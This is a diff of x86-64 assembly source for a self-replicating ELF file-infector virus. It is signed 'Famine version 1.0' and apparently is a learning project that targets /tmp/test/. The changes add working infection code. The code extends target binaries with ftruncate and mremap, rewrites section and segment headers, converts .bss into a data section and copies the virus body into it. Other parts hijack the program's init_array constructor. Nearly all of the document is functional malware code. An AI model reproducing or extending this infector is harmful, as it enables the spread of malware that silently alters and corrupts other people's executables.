@@ -2,7 +2,8 @@ BITS 64
 
 %include "defines.s"
 virus_len equ _end - _start
-virus_lenq equ (virus_len) / 8 + 1
+virus_lenq equ virus_len / 8
+virus_lenb equ virus_len % 8
 
 section .text
     global _start
@@ -58,8 +59,8 @@ readdir:
     xor     r9, r9
     mov     eax, SYS_MMAP
     syscall
-    test    eax, eax
-    jns     end_readdir
+    cmp     rax, 0xffffffffffffff00
+    ja      end_readdir
     mov     [rsp + 0x8], rax
 
 loop_dir:
@@ -142,7 +143,6 @@ right_type_check:
     mov     rdx, SEEK_END
     mov     eax, SYS_LSEEK
     syscall
-    add     rax, virus_len
     mov     [rsp + file_size], rax
     mov     rsi, rax
     xor     rdi, rdi
@@ -268,10 +268,8 @@ check_text_padding:
     add     rdi, [rsp + map]
     lea     rsi, [rel _start]
     mov     rcx, virus_lenq
-copy_payload:
-    lodsq
-    stosq
-    loop    copy_payload
+    call    copy_payload
+
 increase_text_size:
     mov     rax, [rsp + text_phdr_off]
     add     rax, [rsp + map]
@@ -282,26 +280,103 @@ increase_text_size:
     jmp     hijack_constructor
 
 remap_and_infect_data:
-    ; cmp     rax, payload_mprotect_len
-    ; jle     munmap_quit_infect
-    ; mov     rdi, [rsp + map]
-    ; mov     rsi, [rsp + file_size]
-    ; mov     rdx, rsi
-    ; mov     rax, rdi
-    ; add     rax, [rsp + bss_shdr_off]
-    ; add     rdx, [rax + sh_size]
-    ; add     rdx, virus_len
-    ; xor     r10, r10
-    ; mov     eax, SYS_MREMAP
-    ; syscall
-    ; cmp     rax, [rsp + map]
-    ; jne     munmap_quit_infect
-    mov     edi, 1
-    lea     rsi, [rel data_tmp_text]
-    mov     rdx, data_tmp_text.len
-    mov     eax, SYS_WRITE
+    cmp     rax, payload_mprotect_len
+    jle     munmap_quit_infect
+
+    mov     edi, DWORD [rsp + fd]
+    mov     rax, [rsp + map]
+    add     rax, [rsp + bss_shdr_off]
+    mov     rsi, [rsp + file_size]
+    add     rsi, [rax + sh_size]
+    add     rsi, virus_len
+    mov     QWORD [rsp + new_file_size], rsi
+    mov     eax, SYS_FTRUNCATE
     syscall
+    test    eax, eax
+    jnz     munmap_quit_infect
+
+    mov     rdi, [rsp + map]
+    mov     rsi, [rsp + file_size]
+    mov     rdx, [rsp + new_file_size]
+    xor     r10, r10
+    add     r10b, MREMAP_MAYMOVE
+    mov     eax, SYS_MREMAP
+    syscall
+    cmp     rax, 0xffffffffffffff00
+    ja      munmap_quit_infect
+    mov     [rsp + map], rax
+
+shift_end_of_file:
+    mov     rdi, [rsp + new_file_size]
+    mov     rsi, [rsp + file_size]
+    mov     rcx, rsi
+    add     rdi, rax
+    add     rsi, rax
+    add     rax, [rsp + bss_shdr_off]
+    sub     rcx, [rax + sh_offset]
+    inc     rcx
+    std
+memccpy_file: ; We copy the file from the end because destination and sources are overlapping
+    lodsb
+    stosb
+    loop    memccpy_file
+    cld
+
+update_offsets_everywhere:
+    mov     r9, [rsp + new_file_size]
+    sub     r9, [rsp + file_size]
+    add     [rsp + bss_shdr_off], r9
+    mov     rax, [rsp + map]
+    add     [rax + e_shoff], r9
+    mov     rcx, [rsp + bss_shdr_off]
+    sub     rcx, [rax + e_shoff]
+    mov     bx, [rax + e_shnum]
+    movzx   r8, WORD [rax + e_shentsize]
+    mov     rax, rcx
+    cqo
+    div     r8
+    movzx   rcx, bx
+    sub     rcx, rax
+    mov     rax, [rsp + map]
+    add     rax, [rsp + bss_shdr_off]
+    add     rax, r8
+shift_last_sections:
+    add     [rax + sh_offset], r9
+    add     rax, r8
+    loop    shift_last_sections
+
+update_sizes:
+    mov     rax, [rsp + map]
+    mov     rbx, rax
+    add     rbx, [rsp + data_phdr_off]
+    add     [rbx + p_filesz], r9
+    add     [rbx + p_memsz], r9
+    add     rax, [rsp + bss_shdr_off]
+    mov     r10, [rax + sh_size]
+    add     [rax + sh_size], r9
+    mov     DWORD [rax + sh_type], SHT_PROGBITS
+
+    mov     rdx, rax
+    mov     rdi, [rsp + map]
+    add     rdi, [rdx + sh_offset]
+    mov     rcx, r10
+write_bss:
+    xor     al, al
+    stosb
+    loop    write_bss
+
+copy_virus_in_data:
+    mov     rdi, [rsp + map]
+    add     rdi, [rdx + sh_offset]
+    add     rdi, r10
+    lea     rsi, [rel _start]
+    mov     rcx, virus_lenq
+    call    copy_payload
+
+    mov     rdx, [rsp + new_file_size]
+    mov     [rsp + file_size], rdx
     jmp     munmap_quit_infect
+
 hijack_constructor:
     mov     rax, [rsp + map]
     mov     rbx, [rsp + init_array_shdr_off]
@@ -341,6 +416,20 @@ quit_infect:
     leave
     ret
 
+copy_payload:
+    lodsq
+    stosq
+    loop    copy_payload
+    mov     cx, virus_lenb
+    test    cx, cx
+    jz      end_copy
+copy_last_bytes:
+    lodsb
+    stosb
+    loop    copy_last_bytes
+end_copy:
+    ret
+
 payload_mprotect:
     payload_mprotect_len: equ $ - payload_mprotect
     dir1: db "/tmp/test/", 0
@@ -349,7 +438,7 @@ payload_mprotect:
     signature: db "Famine version 1.0 (c)oded by alagroy-", 0
     data_tmp_text: db "Remapping and infecting .data", 10
         .len: equ $ - data_tmp_text
-    ; TIMES 0x4000 db 0
+    TIMES 0x4000 db 0 ; To trigger data infection for testing, will be removed eventuelly
     final_jump: db 0xe9, 0, 0, 0, 0
 _end:
     xor     rdi, rdi
